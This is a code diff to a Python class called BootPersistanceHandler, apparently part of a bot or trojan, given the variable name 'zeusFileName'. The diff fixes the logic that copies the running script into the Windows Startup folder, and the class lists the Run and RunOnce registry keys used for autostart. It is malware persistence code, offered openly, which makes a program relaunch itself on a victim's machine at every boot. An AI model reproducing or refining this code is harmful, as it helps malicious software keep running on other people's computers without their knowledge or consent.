@@ -20,10 +20,7 @@ except ImportError:
 
 class BootPersistanceHandler:
     WINDOWS_START_UP_FOLDER_PREFIX = ""
-    WINDOWS_START_UP_FOLDER_SUFFIX = r"\Start Menu\Programs\StartUp"
-    WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX = r"\AppData\Roaming\Microsoft\Windows\Start"
-
-    START_MENU = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+    WINDOWS_START_UP_FOLDER_SUFFIX = r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
     WINDOWS_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
     WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
@@ -96,18 +93,12 @@ class BootPersistanceHandler:
         return dict
 
     def copyFilesManually(self):
-        # Copy to 1st directory
-        destinationFolder = r"%s%s" % (WINDOWS_START_UP_FOLDER_PREFIX, WINDOWS_START_UP_FOLDER_SUFFIX)
-        filePath = r"%s\%s" % (destinationFolder, os.path.abspath(__file__))
+        filePath = os.path.abspath(__file__)
+        zeusFileName = os.path.basename(filePath)
+        destinationFolder = r"%s%s" % (self.WINDOWS_START_UP_FOLDER_PREFIX, self.WINDOWS_START_UP_FOLDER_SUFFIX,)
+        finalDestination = r"%s\%s" % (destinationFolder, zeusFileName)
 
-        if not os.path.isfile(filePath):
-            copyfile(os.path.abspath(__file__), destinationFolder)
-
-        # Copy to 2nd directory
-        destinationFolder = r"%s%s" % (WINDOWS_START_UP_FOLDER_PREFIX, WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX)
-        filePath = r"%s\%s" % (destinationFolder, os.path.abspath(__file__))
-
-        if not os.path.isfile(filePath):
+        if not os.path.isfile(finalDestination):
             copyfile(os.path.abspath(__file__), destinationFolder)
 
 
